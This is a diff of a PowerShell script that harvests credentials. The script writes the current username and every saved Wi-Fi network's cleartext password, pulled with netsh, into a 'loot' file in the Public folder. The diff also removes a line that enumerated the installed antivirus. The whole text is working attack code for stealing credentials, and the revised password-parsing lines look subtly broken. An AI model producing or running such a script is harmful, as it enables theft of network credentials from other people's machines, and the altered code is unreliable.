@@ -1,14 +1,12 @@
 & {
     $report = "C:\Users\Public\loot_result.txt"
-    "--- СБОР ДАННЫХ: $(Get-Date) ---" | Out-File $report
+    "--- LOOT: $(Get-Date) ---" | Out-File $report -Encoding UTF8
     "User: $env:USERNAME" >> $report
-    "Antivirus: $(Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Select-Object -ExpandProperty displayName)" >> $report
-    "--- WIFI ---" >> $report
+    # Сбор Wi-Fi с принудительным выводом
     netsh wlan show profiles | Select-String "\:(.+)$" | % {
-        $name = $_.Matches.Groups[1].Value.Trim()
-        netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$" | % {
-            "$name : $($_.Matches.Groups[1].Value.Trim())" >> $report
-        }
+        $name = $_.Matches.Groups.Value.Trim()
+        $pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content\W+\:(.+)$").Matches.Groups.Value.Split(":")[1].Trim()
+        if ($pass) { "$name : $pass" >> $report } else { "$name : NO_PASS" >> $report }
     }
-    "--- ИНФО ЗАВЕРШЕНА ---" >> $report
+    "--- DONE ---" >> $report
 }
